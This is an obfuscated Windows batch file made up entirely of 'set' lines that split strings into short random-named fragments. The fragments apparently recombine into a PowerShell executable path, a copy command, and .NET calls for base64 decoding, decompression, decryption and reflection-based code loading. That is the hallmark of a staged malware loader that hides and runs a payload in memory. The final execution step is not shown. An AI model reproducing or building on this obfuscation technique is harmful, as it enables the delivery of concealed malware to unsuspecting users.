@echo off
set "SWRXWZNkBE=ll"
set "wIFwGIMFGX=:\"
set "CDXVaZtCos=\W"
set "gJfMdlcyxX=nd"
set "dgUyqsDRcY=rS"
set "KhUMwndrWv=xe"
set "KFXwfFmVqh=1."
set "ObNYpZgRrn=py"
set "lVwbwoxavL=Po"
set "nBlusIALhC=s\"
set "QZfebVWKVq= C"
set "TcTHAJeZkK=we"
set "VizuWzYvLz=Wi"
set "mIyNShpXBr=0\"
set "rzLwMmYuRr=we"
set "jUfkENyWfP=.e"
set "QjiVSVYkPM=y "
set "GnhIgZJeRQ=st"
set "YwTqzpwUjD=in"
set "KrrUaqXclP=32"
set "WAZwjNDStv=Sy"
set "vJXtifbXLe=\v"
set "oSyXLpWmIQ=do"
set "FoPXrtwwBx=he"
set "dHeemFyKuv=em"
set "cGSboAJiem=ws"
set "lhDzSNHuLZ=co"
set "XxBHdVJQEE= /"
set "nRhdPNWbaG=ll"
set "QWyuCfvrrG=ow"
set "MRUusNljBb=rs"
set "EtqxDVrvOm=po"
set "PevuzroATk=he"
set "xpFOwvMOaN= %~dp0"
set "dUccIWqkKO=cd"
set "EHsydPjMAB=gMod"
set "qVAQNdnxad=sPoW"
set "DOZWewsSfR=kyQC"
set "HiwznEzUlZ=oL'["
set "jcREYgPrfW=($UH"
set "EWEDFmlyTX=('da"
set "HiSZqXLkcV=iron"
set "NiIsPIiakr=);$t"
set "YIoJpYoFqO= [Sy"
set "yjrYuOpYkO=0O+g"
set "LPgXrHNbRc='[-1"
set "dGRKLuRKvE=)($p"
set "igZUHIcCyP=; };"
set "dWYsCqxWna=S = "
set "GtuJjXQJGG=7Yiv"
set "KtANChwoAm=);$t"
set "rvjEWJpwRh=O.Me"
set "HcYlBdVFPK=$Qpe"
set "epDiCImxGI=ion."
set "FPoixdkZdW=oin "
set "VspNjPPPCv=TllA"
set "mnrMeIJUTa=-4] "
set "FFWNtcBdyL=orF'"
set "PmBPoCbmBZ=esaB"
set "gCGbReCekg=null"
set "oWgUiyMGVP=] -j"
set "gGnwYYTwmz=XgGq"
set "LOBypyEENv=:('g"
set "eJupRhTMUP=S46e"
set "WbRunalrts=yste"
set "RPaXzjetaJ=n ''"
set "YwnSuagzbp=3HWs"
set "lPOhiSRcdE== [S"
set "yaJzYPARXK=kyQC"
set "kvyFepOehm=pDZz"
set "QvtjYcnaSe=Comp"
set "kGJdrLhxCG=::De"
set "xzLcYIbvlR=[IO."
set "ThqvELHBRB=g = "
set "JBzIIqUJvu=raph"
set "bqVEmaMVme=();$"
set "QGuZXcvPhw=Bmor"
set "enXzpOFJNw= = $"
set "rhanbOuEwm= = $"
set "CkKjhpJEkf=L = "
set "hVKUDZuimz=[Sys"
set "YGwTFKhCvr=ne);"
set "enzXwFnAhg=brea"
set "aoiiofEBZm=k; }"
set "lqkxGozZfe=$pkq"
set "RcMioADfXY=.IO."
set "iZfMvRSGQM=kyQC"
set "atYkNYwRXq=form"
set "CmvokEecoA=LvD."
set "WTCoKEsUkx=ddin"
set "XVegRsMGoW=y.Pa"
set "RQHoZMDybp=trea"
set "rUGWAXrQhS=flec"
set "mRRuPRQRbb=yste"
set "OavyEHjvYb= '')"
set "XQcQkjkJjV=onve"
set "bhPgrKpTJE=Secu"
set "tZdABEueSR=UHeQ"
set "BjowkEAHGO=nirt"
set "tgosaskScW=A) {"
set "IBzsQWsnzh=cA ="
set "ivpvtkBZBT=.Mem"
set "CZXCJrJDtp=ing("
set "wmOWXHNrzg=em.I"
set "fqLHNXmafb=eQf."
set "ntSDVtEoua=ck($"
set "CCYyrDbZEG=ptor"
set "djwmoTiETY=bQ ="
set "LvriUDOThT=t Sy"
